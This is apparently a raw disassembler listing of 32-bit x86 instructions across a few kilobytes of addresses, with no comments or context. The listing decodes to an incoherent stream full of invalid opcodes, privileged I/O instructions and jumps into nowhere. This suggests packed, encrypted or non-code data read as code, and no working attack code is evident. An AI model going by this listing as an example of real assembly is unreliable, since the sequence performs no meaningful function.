  41d4e3:	mov    eax,esp
  41d4e5:	mov    eax,ds:0x60c4c012
  41d4ea:	sub    DWORD PTR [eax+0x47795e3d],edx
  41d4f0:	mov    ds:0xdaf5d2e3,eax
  41d4f5:	es pop ebx
  41d4f7:	outs   dx,DWORD PTR ds:[esi]
  41d4f8:	sub    bl,BYTE PTR [ecx-0x1ab7ccfc]
  41d4fe:	sub    BYTE PTR [esi+0x24],0x98
  41d502:	lods   al,BYTE PTR ds:[esi]
  41d503:	sti    
  41d504:	adc    cl,BYTE PTR [edx]
  41d506:	repnz sbb eax,0x3c4c1154
  41d50c:	dec    esi
  41d50d:	jmp    0x41d583
  41d50f:	add    cl,BYTE PTR [edx]
  41d511:	stc    
  41d512:	(bad)  
  41d513:	ficom  DWORD PTR [esi-0x27]
  41d516:	fs aam 0x52
  41d519:	inc    ebp
  41d51a:	push   es
  41d51b:	scas   al,BYTE PTR es:[edi]
  41d51c:	sbb    BYTE PTR [ebp-0x394e55a5],ah
  41d522:	icebp  
  41d523:	lods   al,BYTE PTR ds:[esi]
  41d524:	push   cs
  41d525:	std    
  41d526:	push   ebp
  41d527:	iret   
  41d528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d529:	lahf   
  41d52a:	shr    DWORD PTR [ebp-0x364d904f],cl
  41d530:	xchg   ebx,eax
  41d531:	ins    BYTE PTR es:[edi],dx
  41d532:	mov    ebp,0xc8168632
  41d537:	cmp    eax,0xd7f0cccd
  41d53c:	enter  0x5643,0x5b
  41d540:	inc    ebx
  41d541:	mov    dh,0x18
  41d543:	ss loope 0x41d50f
  41d546:	fs cwde 
  41d548:	jmp    DWORD PTR [esi]
  41d54a:	(bad)  
  41d54b:	div    BYTE PTR [esi+0xc]
  41d54e:	icebp  
  41d54f:	ss aad 0x7e
  41d552:	xor    ebp,0xe5ad6408
  41d558:	sbb    bl,BYTE PTR ds:0xa641219b
  41d55e:	std    
  41d55f:	cdq    
  41d560:	in     al,dx
  41d561:	or     ecx,DWORD PTR [edx]
  41d563:	fimul  DWORD PTR ds:0x9b701183
  41d569:	jmp    0x9edc:0x65b0d90d
  41d570:	or     BYTE PTR [edi+0x48],bh
  41d573:	or     al,0xf2
  41d575:	push   ds
  41d576:	mov    ds:0x3b1b0c77,al
  41d57b:	cmp    al,0xc7
  41d57d:	sbb    dl,dh
  41d57f:	and    DWORD PTR [ebx-0x20790a3a],ebp
  41d585:	stc    
  41d586:	xchg   ecx,eax
  41d587:	stc    
  41d588:	cmovnp ebp,DWORD PTR [ebx+0x433f0c8d]
  41d58f:	adc    ecx,DWORD PTR [ebx-0x6d772ae4]
  41d595:	xor    DWORD PTR [edi],esp
  41d597:	scas   eax,DWORD PTR es:[edi]
  41d598:	ret    0x1861
  41d59b:	fisttp QWORD PTR [edx]
  41d59d:	xlat   BYTE PTR ds:[ebx]
  41d59e:	je     0x41d579
  41d5a0:	adc    DWORD PTR [ebp+0xcbad617],esp
  41d5a6:	rcr    DWORD PTR [ecx+0x34a404df],cl
  41d5ac:	std    
  41d5ad:	scas   eax,DWORD PTR es:[edi]
  41d5ae:	adc    ecx,ecx
  41d5b0:	test   eax,0xbe98c1f6
  41d5b5:	pop    edx
  41d5b6:	sub    bh,BYTE PTR [edi+0x7d]
  41d5b9:	xchg   ecx,eax
  41d5ba:	push   es
  41d5bb:	xchg   ebp,eax
  41d5bc:	mov    ds:0xa60d0737,eax
  41d5c1:	mov    ebx,0xaf6b705
  41d5c6:	gs (bad) 
  41d5c8:	or     BYTE PTR ds:0x7d494d15,bh
  41d5ce:	arpl   WORD PTR [ebx-0x45],dx
  41d5d1:	call   0xd34810bc
  41d5d6:	mov    ecx,0x33648d2d
  41d5db:	out    dx,eax
  41d5dc:	adc    ebx,DWORD PTR [ecx]
  41d5de:	inc    esp
  41d5df:	fcmovnb st,st(4)
  41d5e1:	add    BYTE PTR cs:[esi],cl
  41d5e4:	addr16 aam 0x5f
  41d5e7:	rcr    esp,1
  41d5e9:	test   DWORD PTR [ecx],edi
  41d5eb:	std    
  41d5ec:	mov    ds:0x715fcb33,eax
  41d5f1:	sbb    ah,BYTE PTR ds:0x69dd9a19
  41d5f8:	ins    DWORD PTR es:[edi],dx
  41d5f9:	mov    bl,0x83
  41d5fb:	add    al,0x4
  41d5fd:	xor    BYTE PTR [ecx],0x9f
  41d600:	ret    0x8305
  41d603:	call   0x98a08a5a
  41d608:	iret   
  41d609:	add    BYTE PTR [ebx+ecx*1-0x69],bh
  41d60d:	pop    ds
  41d60e:	retf   
  41d60f:	or     al,0xfa
  41d611:	mov    edi,0x7bcc6239
  41d616:	push   eax
  41d617:	dec    esi
  41d618:	pop    edx
  41d619:	push   ss
  41d61a:	mov    bh,0xed
  41d61c:	and    eax,0x7c197037
  41d621:	retf   0xc52
  41d624:	nop
  41d625:	fadd   st(5),st
  41d627:	sbb    dh,BYTE PTR [ebp-0xc]
  41d62a:	jle    0x41d66b
  41d62c:	adc    ch,BYTE PTR [edi+0x63]
  41d62f:	imul   ebp,ebp,0xffffffa6
  41d632:	ds sub al,0x45
  41d635:	je     0x41d5c2
  41d637:	out    dx,al
  41d638:	jo     0x41d5fd
  41d63a:	dec    edi
  41d63b:	inc    eax
  41d63c:	sbb    al,BYTE PTR [ecx+eiz*2+0x63675db3]
  41d643:	xor    DWORD PTR [edx+edi*4],eax
  41d646:	sbb    bh,BYTE PTR [edi-0x51]
  41d649:	or     esi,ebp
  41d64b:	jne    0x41d61e
  41d64d:	xchg   ecx,eax
  41d64e:	(bad)  
  41d64f:	xchg   esi,eax
  41d650:	inc    ebx
  41d651:	jp     0x41d65a
  41d653:	push   esi
  41d654:	cli    
  41d655:	mov    ebx,0x48194a0a
  41d65a:	jg     0x41d6a0
  41d65c:	adc    BYTE PTR [ebp-0xf9ef5b3],dh
  41d662:	scas   eax,DWORD PTR es:[edi]
  41d663:	ja     0x41d616
  41d665:	mov    ds:0xb3c26a23,eax
  41d66a:	(bad)  
  41d66b:	repnz movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41d66e:	cmp    eax,0x15561bdc
  41d673:	mov    esp,0x7b0f8b36
  41d678:	jnp    0x41d6c0
  41d67a:	mov    eax,ds:0x9c914769
  41d67f:	sbb    BYTE PTR [edx-0x67d182b1],al
  41d685:	mov    esi,0xc7709029
  41d68a:	jmp    0xb5fb:0x3ac6e78d
  41d691:	fcomi  st,st(1)
  41d693:	xchg   BYTE PTR [eax-0x6c5e2694],cl
  41d699:	sbb    ebx,DWORD PTR [ebx+esi*8]
  41d69c:	in     eax,dx
  41d69d:	test   dh,bl
  41d69f:	sub    eax,0x29b1b73e
  41d6a4:	cmp    edi,esp
  41d6a6:	cwde   
  41d6a7:	pop    esp
  41d6a8:	push   edi
  41d6a9:	popf   
  41d6aa:	push   ebp
  41d6ab:	adc    bh,ah
  41d6ad:	jae    0x41d68b
  41d6af:	fsubrp st(4),st
  41d6b1:	sub    al,0x80
  41d6b3:	cdq    
  41d6b4:	dec    ecx
  41d6b5:	inc    esi
  41d6b6:	sub    BYTE PTR [eax],dh
  41d6b8:	das    
  41d6b9:	jle    0x41d714
  41d6bb:	jg     0x41d683
  41d6bd:	imul   esi,eax,0xffffffd5
  41d6c0:	and    al,0x75
  41d6c3:	and    DWORD PTR [edi-0x10],ebp
  41d6c6:	add    DWORD PTR [eax],eax
  41d6c8:	call   0x2741d6ce
  41d6cd:	(bad)  
  41d6ce:	xor    bl,ah
  41d6d0:	fsub   QWORD PTR [ebp-0x4d]
  41d6d3:	popa   
  41d6d4:	fwait
  41d6d5:	imul   esp,DWORD PTR [edi+0x7a],0xead0dd9f
  41d6dc:	pop    ss
  41d6dd:	cmp    eax,0xe345ba89
  41d6e2:	scas   eax,DWORD PTR es:[edi]
  41d6e3:	and    ecx,ebx
  41d6e5:	sahf   
  41d6e6:	sar    DWORD PTR ds:0xbe8ab75b,0x5e
  41d6ed:	or     BYTE PTR [eax+0x52],ah
  41d6f0:	gs mov edi,0x9e24af16
  41d6f6:	(bad)  
  41d6f7:	retf   0xd775
  41d6fa:	jmp    0xf33f:0x887660f
  41d701:	mov    eax,0xb376dd50
  41d706:	leave  
  41d707:	and    ch,BYTE PTR [ecx]
  41d709:	enter  0xfe65,0xde
  41d70d:	outs   dx,DWORD PTR ds:[esi]
  41d70e:	mov    dh,0x89
  41d710:	pop    eax
  41d711:	fxch   st(3)
  41d713:	sbb    al,0x3d
  41d715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d716:	pushf  
  41d717:	inc    edx
  41d718:	pusha  
  41d719:	jbe    0x41d6ec
  41d71b:	inc    ebx
  41d71c:	push   cs
  41d71d:	pop    ds
  41d71e:	jmp    0x41d765
  41d720:	mov    eax,0x855ebd7
  41d725:	test   al,0x61
  41d727:	xor    al,dl
  41d729:	imul   ebp,DWORD PTR ds:0x19a8932e,0xffffffcd
  41d730:	pop    ds
  41d731:	sahf   
  41d732:	dec    ebp
  41d733:	int3   
  41d734:	jnp    0x41d762
  41d736:	repz pop ebx
  41d738:	enter  0xc384,0x4e
  41d73c:	in     eax,0xb4
  41d73e:	fld    st(4)
  41d740:	mov    ah,0x54
  41d742:	fwait
  41d743:	mov    ch,0x94
  41d745:	jno    0x41d70b
  41d747:	js     0x41d6d3
  41d749:	and    dl,ah
  41d74b:	inc    ebx
  41d74c:	int    0x94
  41d74e:	mov    BYTE PTR [edx],0xa1
  41d751:	push   ebp
  41d752:	add    edx,DWORD PTR [ebp+0x7d]
  41d755:	and    al,0x77
  41d757:	add    ch,dl
  41d759:	mov    ebx,0xecb7e105
  41d75e:	lahf   
  41d75f:	adc    BYTE PTR [edx],cl
  41d761:	sbb    eax,0x72e45494
  41d766:	es mov sp,0x1819
  41d76b:	jns    0x41d7df
  41d76d:	cmp    DWORD PTR ds:0xf52dd5cd,0x698b12c0
  41d777:	xchg   esp,eax
  41d778:	jno    0x41d7c0
  41d77a:	and    al,0xae
  41d77c:	dec    esi
  41d77d:	pop    ebx
  41d77e:	jnp    0x41d778
  41d780:	xor    bh,BYTE PTR [eax+eax*1]
  41d783:	loope  0x41d7c0
  41d785:	arpl   WORD PTR [ecx],ax
  41d787:	jg     0x41d788
  41d789:	dec    esi
  41d78a:	mov    ah,0xf0
  41d78c:	not    DWORD PTR [edx]
  41d78e:	daa    
  41d78f:	sub    eax,0xd7074b73
  41d794:	jmp    DWORD PTR [ebx]
  41d796:	pop    ecx
  41d797:	jecxz  0x41d73b
  41d799:	add    esp,ebx
  41d79b:	sbb    DWORD PTR [ebx+0x1848038c],esi
  41d7a1:	sub    al,0x3d
  41d7a3:	sub    eax,0xfd46d256
  41d7a8:	xor    edi,edi
  41d7aa:	mov    edi,0xaf72369e
  41d7af:	xchg   edx,eax
  41d7b0:	imul   edi,eax,0x509e6247
  41d7b6:	push   ecx
  41d7b7:	dec    ebx
  41d7b8:	sub    ecx,DWORD PTR [esi]
  41d7ba:	fisttp WORD PTR [esi-0x67]
  41d7bd:	imul   edi,DWORD PTR [ecx+0x618bf6ec],0x99568989
  41d7c7:	iret   
  41d7c8:	ss stc 
  41d7ca:	mov    ecx,0x5147297a
  41d7cf:	jecxz  0x41d84f
  41d7d1:	outs   dx,DWORD PTR ds:[esi]
  41d7d2:	popa   
  41d7d3:	xchg   ebx,eax
  41d7d4:	sbb    dl,BYTE PTR [eax]
  41d7d6:	call   0x1f6fc99d
  41d7db:	inc    ecx
  41d7dc:	aad    0xce
  41d7de:	push   edx
  41d7df:	(bad)  
  41d7e0:	sub    eax,0xd0684b6b
  41d7e5:	mov    ds:0x1e61527e,al
  41d7ea:	jb     0x41d7f8
  41d7ec:	ror    esi,cl
  41d7ee:	mov    WORD PTR [ebp+0x4d],cs
  41d7f1:	fdiv   QWORD PTR [ebx+0x6017b15c]
  41d7f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7f8:	not    DWORD PTR [ebp+eiz*1+0x23e45476]
  41d7ff:	mov    edi,0x2482167a
  41d804:	jb     0x41d866
  41d806:	stc    
  41d807:	shl    BYTE PTR [eax-0x27ac1aaf],1
  41d80d:	inc    edi
  41d80e:	popf   
  41d80f:	or     edx,DWORD PTR [ecx+0x6f]
  41d812:	and    ah,BYTE PTR [edi-0x79]
  41d815:	(bad)  
  41d816:	out    0x21,al
  41d818:	mov    DWORD PTR [edx],eax
  41d81a:	dec    esp
  41d81b:	pushf  
  41d81c:	leave  
  41d81d:	adc    ecx,edi
  41d81f:	mov    ecx,0x1765958a
  41d824:	xchg   eax,esi
  41d826:	mov    al,0x1f
  41d828:	fcmovbe st,st(3)
  41d82a:	mov    al,ds:0x4b0ca032
  41d82f:	inc    ecx
  41d830:	dec    ebp
  41d831:	in     eax,dx
  41d832:	gs dec esi
  41d834:	push   esi
  41d835:	or     BYTE PTR [edx],cl
  41d837:	push   esi
  41d838:	stc    
  41d839:	lods   eax,DWORD PTR ds:[esi]
  41d83a:	imul   ebx,DWORD PTR ds:0x8717ca4d,0xffffffd7
  41d841:	in     al,0x7d
  41d843:	jg     0x41d86a
  41d845:	sbb    eax,0x2f3aa25e
  41d84a:	xchg   esp,eax
  41d84b:	aas    
  41d84c:	xor    ecx,DWORD PTR [esi+0x50]
  41d84f:	pop    ss
  41d850:	dec    ebx
  41d851:	mov    ch,0x5f
  41d853:	adc    al,0x79
  41d855:	sti    
  41d856:	xchg   esp,eax
  41d857:	test   eax,0xb76baab8
  41d85c:	cld    
  41d85d:	hlt    
  41d85e:	push   ecx
  41d85f:	(bad)  
  41d861:	mov    ds:0x8e40fbda,eax
  41d866:	xor    ebp,DWORD PTR [edx-0x255d4a72]
  41d86c:	inc    ebx
  41d86d:	(bad)  
  41d86e:	add    DWORD PTR [edi-0x31],eax
  41d871:	mov    edi,0xf861431f
  41d876:	add    bl,dh
  41d878:	sahf   
  41d879:	mov    edx,0xd45b600f
  41d87e:	jo     0x41d811
  41d880:	mov    eax,ds:0x24137ba8
  41d885:	sbb    ch,BYTE PTR [eax]
  41d887:	ins    DWORD PTR es:[edi],dx
  41d888:	push   ebx
  41d889:	xlat   BYTE PTR ds:[ebx]
  41d88a:	jmp    0x41d8f7
  41d88c:	fisub  DWORD PTR [esi]
  41d88f:	xchg   DWORD PTR ds:0x3b455693,edi
  41d895:	jg     0x41d8f3
  41d897:	fimul  WORD PTR [ebx-0x17d16063]
  41d89d:	jge    0x41d8d5
  41d89f:	jmp    0x41d863
  41d8a1:	fs mov bh,0x99
  41d8a4:	jp     0x41d918
  41d8a6:	cmp    eax,0x9b72676b
  41d8ab:	mov    edi,DWORD PTR [ecx+edx*8-0x5454988b]
  41d8b2:	xchg   esp,eax
  41d8b3:	into   
  41d8b4:	addr16 (bad) 
  41d8b6:	and    dh,dh
  41d8b8:	mov    eax,ds:0xe7d7f7f6
  41d8bd:	mov    eax,0x1a13da72
  41d8c2:	fucom  st(2)
  41d8c4:	push   edi
  41d8c5:	repnz add DWORD PTR [eax],eax
  41d8c8:	call   0x5541d8ce
  41d8cd:	call   0xd320a7fd
  41d8d2:	cmc    
  41d8d3:	pop    ebx
  41d8d4:	ins    DWORD PTR es:[edi],dx
  41d8d5:	fidivr WORD PTR [esi]
  41d8d7:	or     BYTE PTR [ecx],ah
  41d8d9:	lock out 0x95,al
  41d8dc:	(bad)  
  41d8dd:	js     0x41d912
  41d8df:	out    0x13,eax
  41d8e1:	retf   
  41d8e2:	out    dx,al
  41d8e3:	scas   al,BYTE PTR es:[edi]
  41d8e4:	jg     0x41d8d6
  41d8e6:	push   0x71
  41d8e8:	mov    edi,0x889a2c79
  41d8ed:	popa   
  41d8ee:	xchg   edx,eax
  41d8ef:	stos   DWORD PTR es:[edi],eax
  41d8f0:	test   eax,0x4bb5eded
  41d8f5:	dec    edx
  41d8f6:	scas   al,BYTE PTR es:[edi]
  41d8f7:	retf   0xb550
  41d8fa:	cwde   
  41d8fb:	jge    0x41d8f7
  41d8fd:	and    ch,BYTE PTR [eax]
  41d8ff:	stos   BYTE PTR es:[edi],al
  41d900:	sub    BYTE PTR [edi*8-0x7c3fde51],bl
  41d907:	std    
  41d908:	push   ss
  41d909:	aas    
  41d90a:	lahf   
  41d90b:	int3   
  41d90c:	xor    al,0x73
  41d90e:	ins    BYTE PTR es:[edi],dx
  41d90f:	(bad)  
  41d910:	mov    ebp,0x2d2b1d2f
  41d915:	scas   eax,DWORD PTR es:[edi]
  41d916:	sub    ch,BYTE PTR [edi]
  41d918:	push   esi
  41d919:	or     ch,BYTE PTR [ecx+0x5d83b1ec]
  41d91f:	mov    ecx,0xa2c0f691
  41d924:	out    0x5e,eax
  41d926:	jmp    0xe40fc1fc
  41d92b:	xor    dh,BYTE PTR [edx-0x56d3c2f5]
  41d931:	repz push 0x5c0354de
  41d937:	repz loop 0x41d978
  41d93a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d93b:	jl     0x41d98a
  41d93d:	jmp    0x41d9a8
  41d93f:	and    BYTE PTR [ebp+0x2584a566],ch
  41d945:	jbe    0x41d957
  41d947:	mov    edx,0xb1ad48d3
  41d94c:	add    eax,0x55feb37f
  41d951:	es out 0xc8,al
  41d954:	dec    eax
  41d955:	xlat   BYTE PTR ds:[ebx]
  41d956:	(bad)  
  41d957:	jg     0x41d9ce
  41d959:	mov    esi,0x1a8046b0
  41d95e:	adc    DWORD PTR [eax+0x7b7bba48],edx
  41d964:	fs dec edx
  41d966:	xchg   ebx,eax
  41d967:	out    0xbf,al
  41d969:	test   eax,0xc3e2abd4
  41d96e:	xchg   BYTE PTR [ebx],ah
  41d970:	pop    ebx
  41d971:	xor    edx,DWORD PTR [ebp+0x5b]
  41d974:	test   eax,0xff6dfc85
  41d979:	shr    BYTE PTR [edx+edi*2+0x5e],0x79
  41d97e:	cli    
  41d97f:	out    dx,eax
  41d980:	inc    ecx
  41d981:	retf   
  41d982:	std    
  41d983:	or     bl,BYTE PTR [edi+0x3f]
  41d986:	and    BYTE PTR [edx+0x64fddbc9],dh
  41d98c:	sub    eax,0x18c2fe0d
  41d991:	int3   
  41d992:	cmp    ah,dh
  41d994:	jg     0x41d9df
  41d996:	jp     0x41d947
  41d998:	mov    dl,0x2
  41d99a:	push   ss
  41d99b:	dec    ecx
  41d99c:	jae    0x41d929
  41d99e:	dec    edi
  41d99f:	sar    DWORD PTR [ebp+0x41],1
  41d9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9a3:	jbe    0x41d970
  41d9a5:	pop    ebp
  41d9a6:	fisub  DWORD PTR [esp+esi*4]
  41d9a9:	and    al,0xb3
  41d9ab:	sbb    esi,DWORD PTR [eax]
  41d9ad:	push   esp
  41d9ae:	inc    ebx
  41d9af:	mov    esp,0xadae33cc
  41d9b4:	mov    ch,0x57
  41d9b6:	das    
  41d9b7:	mov    bl,0x33
  41d9b9:	std    
  41d9ba:	and    DWORD PTR [ecx],0x7d
  41d9bd:	fld1   
  41d9bf:	and    DWORD PTR [eax*1+0x674c676d],edx
  41d9c6:	pop    ss
  41d9c7:	leave  
  41d9c8:	mov    esi,0xb2cb347d
  41d9cd:	add    eax,0x1fc3e451
  41d9d2:	ja     0x41d981
  41d9d4:	imul   esp,edx,0x37d24aa7
  41d9da:	cmp    BYTE PTR [ebx*2+0x47651201],ch
  41d9e1:	popa   
  41d9e2:	loopne 0x41d975
  41d9e4:	mov    dl,0xf2
  41d9e6:	cdq    
  41d9e7:	jmp    0x301b:0xd55fbb9d
  41d9ee:	or     esi,DWORD PTR [ecx-0x13]
  41d9f1:	shl    BYTE PTR [eax],cl
  41d9f3:	pop    ecx
  41d9f4:	lock mov ecx,DWORD PTR [ecx-0x43]
  41d9f8:	pop    esp
  41d9f9:	pop    ss
  41d9fa:	mov    edi,0x47b815d4
  41d9ff:	and    DWORD PTR [esi+0x72],ebp
  41da02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da03:	xchg   ebx,eax
  41da04:	call   0x2b6b82dc
  41da09:	add    bh,BYTE PTR [ecx-0x7b]
  41da0c:	add    eax,0x802695f6
  41da11:	or     esp,ebp
  41da13:	mov    ecx,DWORD PTR [eax+0x6c]
  41da16:	popf   
  41da17:	sub    dh,ah
  41da19:	xchg   edi,eax
  41da1a:	add    al,0xf3
  41da1c:	scas   eax,DWORD PTR es:[edi]
  41da1d:	mov    dh,0x55
  41da1f:	inc    eax
  41da20:	xchg   edi,eax
  41da21:	cs push edx
  41da23:	pushf  
  41da24:	and    DWORD PTR [edi+ebx*1-0x6850ba3c],eax
  41da2b:	inc    eax
  41da2c:	dec    ebp
  41da2d:	les    esp,FWORD PTR [edi+0x26e22cb9]
  41da33:	(bad)  
  41da34:	and    DWORD PTR [ebx+0x5b956d88],ecx
  41da3a:	ret    0xd3ae
  41da3d:	xlat   BYTE PTR ds:[ebx]
  41da3e:	or     BYTE PTR [ebp-0x7ed43c6c],ch
  41da44:	pop    ss
  41da45:	mov    dl,0x4
  41da47:	xchg   edi,eax
  41da48:	xlat   BYTE PTR ds:[ebx]
  41da49:	aaa    
  41da4a:	pop    edx
  41da4b:	sbb    al,0xc6
  41da4d:	stos   BYTE PTR es:[edi],al
  41da4e:	mul    BYTE PTR [ebp+0x5347fed]
  41da54:	sbb    BYTE PTR [edx-0x360d6984],dh
  41da5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da5b:	inc    eax
  41da5c:	stc    
  41da5d:	sub    DWORD PTR [edi+0x69],0x881d6938
  41da64:	or     ecx,ebx
  41da66:	sar    DWORD PTR [esi+0x54f8d33a],1
  41da6c:	push   ss
  41da6d:	rol    DWORD PTR [ebx],0xd1
  41da70:	mov    dh,0xda
  41da72:	sbb    esp,DWORD PTR ds:0x575623f2
  41da78:	cli    
  41da79:	cmp    eax,0x8317574
  41da7e:	sub    al,0xc5
  41da80:	sahf   
  41da81:	dec    esp
  41da82:	or     al,0x88
  41da84:	inc    BYTE PTR [edi-0x7ed066b7]
  41da8a:	fcomp  QWORD PTR [eax]
  41da8c:	and    ebx,ebx
  41da8e:	pop    ds
  41da8f:	out    0x9e,eax
  41da91:	xchg   DWORD PTR [edi-0x3addbb96],esp
  41da97:	jmp    0xab871232
  41da9c:	cs out 0x70,eax
  41da9f:	inc    edx
  41daa0:	ret    
  41daa1:	ret    
  41daa2:	and    ebp,DWORD PTR [edx-0x1aacdb19]
  41daa8:	retf   0x8b0f
  41daab:	xchg   ecx,eax
  41daac:	mov    cl,0xb9
  41daae:	jmp    0x8d23e399
  41dab3:	in     al,dx
  41dab4:	ret    
  41dab5:	or     eax,0xefee66a6
  41daba:	ret    
  41dabb:	lods   eax,DWORD PTR ds:[esi]
  41dabc:	sub    al,0xb8
  41dabe:	mov    ds:0x9a4be47,eax
  41dac3:	(bad)  
  41dac5:	hlt    
  41dac6:	add    DWORD PTR [eax],eax
  41dac8:	call   0x1941dace
  41dacd:	cwde   
  41dace:	pop    esp
  41dacf:	ret    0xbc45
  41dad2:	call   0xd3d42c04
  41dad7:	mov    ds:0x4dd803fd,al
  41dadc:	rcl    DWORD PTR [ebx-0x8],0xcf
  41dae0:	inc    esp
  41dae1:	int3   
  41dae2:	and    BYTE PTR [edi+0x7b],0x51
  41dae6:	pop    esi
  41dae7:	jnp    0x41db28
  41dae9:	pushf  
  41daea:	psubusw mm2,QWORD PTR [edi-0x15b109ab]
  41daf1:	lods   al,BYTE PTR ds:[esi]
  41daf2:	xchg   BYTE PTR [edx],al
  41daf4:	cmc    
  41daf5:	movhps QWORD PTR [ebx+edi*2+0x66],xmm1
  41dafa:	jp     0x41db39
  41dafc:	mov    DWORD PTR [ebx-0x3],edi
  41daff:	sub    esp,DWORD PTR [eax]
  41db01:	ja     0x41dae1
  41db03:	paddsw mm7,mm0
  41db06:	jo     0x41db7b
  41db08:	in     eax,0x92
  41db0a:	xchg   ebp,eax
  41db0b:	out    0x55,al
  41db0d:	(bad)  
  41db0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db10:	ja     0x41db4d
  41db12:	outs   dx,DWORD PTR ds:[esi]
  41db13:	dec    esi
  41db14:	cmp    DWORD PTR [esi+0x95dba6],0xffffffb8
  41db1b:	xor    eax,0xe7d43d55
  41db20:	test   BYTE PTR [ebp+0x35],bh
  41db23:	cwd    
  41db25:	push   ds
  41db26:	sets   BYTE PTR [esp+edi*8+0x39]
  41db2b:	mov    esi,ds
  41db2d:	mov    al,ds:0xba879dd4
  41db32:	cmp    esi,DWORD PTR [esi-0x76]
  41db35:	inc    ebx
  41db36:	sbb    dl,BYTE PTR [edi+0x52]
  41db39:	jp     0x41dbb3
  41db3b:	push   ebx
  41db3c:	in     al,dx
  41db3d:	jecxz  0x41dae2
  41db3f:	xchg   esi,eax
  41db40:	adc    ebx,ecx
  41db42:	inc    ebx
  41db43:	xor    al,0xa6
  41db45:	sub    al,0xbb
  41db47:	sub    esp,DWORD PTR [eax*1+0x64c97480]
  41db4e:	mov    WORD PTR [ebp+0x6ab6dac3],?
  41db54:	mov    ebx,0xdd29ed81
  41db59:	pop    esi
  41db5a:	stos   DWORD PTR es:[edi],eax
  41db5b:	lods   eax,DWORD PTR ds:[esi]
  41db5c:	jp     0x41db46
  41db5e:	neg    DWORD PTR [edi]
  41db60:	mov    bh,0xdf
  41db62:	push   esp
  41db63:	cmp    al,0x16
  41db65:	add    DWORD PTR [edi-0x534fffd8],ebx
  41db6b:	add    ah,ch
  41db6d:	enter  0xcb3a,0x87
  41db71:	scas   eax,DWORD PTR es:[edi]
  41db72:	(bad)  
  41db74:	dec    ecx
  41db75:	sahf   
  41db76:	into   
  41db77:	jnp    0x41db19
  41db79:	aas    
  41db7a:	push   ebx
  41db7b:	shr    DWORD PTR [edx-0x592dd44],cl
  41db81:	sub    eax,edi
  41db83:	std    
  41db84:	imul   eax,DWORD PTR [ebp-0x1f],0xffffffa8
  41db88:	sbb    ebx,DWORD PTR [ebx-0x7c6b1cc4]
  41db8e:	xor    BYTE PTR [ebx+0x5709d62e],ch
  41db94:	fisttp QWORD PTR [esi-0x1b]
  41db97:	add    ah,BYTE PTR [ecx+0x5f]
  41db9a:	xor    eax,0x12221300
  41db9f:	sbb    al,0x56
  41dba1:	cli    
  41dba2:	arpl   WORD PTR [esp+edx*2+0x76],sp
  41dba6:	dec    eax
  41dba7:	mov    ecx,0xf83817cf
  41dbac:	xchg   edx,eax
  41dbad:	je     0x41db89
  41dbaf:	dec    esi
  41dbb0:	add    DWORD PTR [ecx-0x39],esp
  41dbb3:	jecxz  0x41db78
  41dbb5:	or     cl,BYTE PTR [edi-0x6aeacd85]
  41dbbb:	mov    eax,ds:0xdf020e26
  41dbc0:	adc    DWORD PTR [esp+eax*2+0x16a829f],eax
  41dbc7:	or     eax,0xdb86e6ba
  41dbcc:	and    al,0xdf
  41dbce:	mov    eax,0x6625c58c
  41dbd3:	pop    eax
  41dbd4:	mov    al,0xf2
  41dbd6:	jmp    0x41dbdf
  41dbd8:	in     eax,0x3b
  41dbda:	lock mov bl,0x4c
  41dbdd:	mov    DWORD PTR [eax+eax*8-0x19],edx
  41dbe1:	mov    edx,0x3d87f867
  41dbe6:	cmc    
  41dbe7:	or     DWORD PTR [eax-0x67],0xbddb0ef6
  41dbee:	ins    BYTE PTR es:[edi],dx
  41dbef:	imul   ebp,DWORD PTR [esi],0xffffffa0
  41dbf2:	add    DWORD PTR cs:[eax],esp
  41dbf5:	mov    DWORD PTR [ecx+edx*1-0x374074fc],eax
  41dbfc:	and    BYTE PTR [ebx],bh
  41dbfe:	mov    bl,0xcc
  41dc00:	ins    BYTE PTR es:[edi],dx
  41dc01:	out    dx,al
  41dc02:	add    eax,0x6c4f513e
  41dc07:	pop    edi
  41dc08:	xchg   edx,eax
  41dc09:	pop    ecx
  41dc0a:	cmp    dh,dh
  41dc0c:	xor    al,0xd
  41dc0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc0f:	or     bh,BYTE PTR [eax]
  41dc11:	retf   0x4140
  41dc14:	mov    dl,dl
  41dc16:	sar    ah,1
  41dc18:	push   es
  41dc19:	lods   al,BYTE PTR ds:[esi]
  41dc1a:	push   eax
  41dc1b:	cmp    al,0xc5
  41dc1d:	sbb    eax,0x29e23d18
  41dc22:	sub    al,0xd0
  41dc24:	mov    edi,0xfd0cb8ad
  41dc29:	arpl   WORD PTR [edi],bx
  41dc2b:	shl    DWORD PTR ds:0x883cec6d,0x90
  41dc32:	mov    ebp,0x96a7f6bb
  41dc37:	hlt    
  41dc38:	mov    ds:0x7587e77,al
  41dc3d:	sti    
  41dc3e:	inc    ecx
  41dc3f:	jmp    0x41dbfd
  41dc41:	dec    ecx
  41dc42:	add    al,0xcd
  41dc44:	or     bl,BYTE PTR [ecx-0x10aface8]
  41dc4a:	bound  esi,QWORD PTR [ebx+esi*4+0x5910cbb]
  41dc51:	sbb    al,0xea
  41dc53:	inc    edi
  41dc54:	mov    dh,0x6c
  41dc56:	sub    eax,0xf4a5ab22
  41dc5b:	inc    esp
  41dc5c:	xchg   DWORD PTR [ebx-0x2c],edi
  41dc5f:	pop    esi
  41dc60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc61:	gs and al,0xb7
  41dc64:	ds nop
  41dc66:	jnp    0x41dcd6
  41dc68:	imul   edi,DWORD PTR [ebp+0x7e],0x2c
  41dc6c:	push   edx
  41dc6d:	xchg   edi,eax
  41dc6e:	mov    WORD PTR [eax-0x487d0ad5],?
  41dc74:	add    dl,BYTE PTR [ebx+0x158d0fb1]
  41dc7a:	xchg   DWORD PTR [edi+0x27],ebp
  41dc7d:	lods   al,BYTE PTR ds:[esi]
  41dc7e:	mov    cl,0x4a
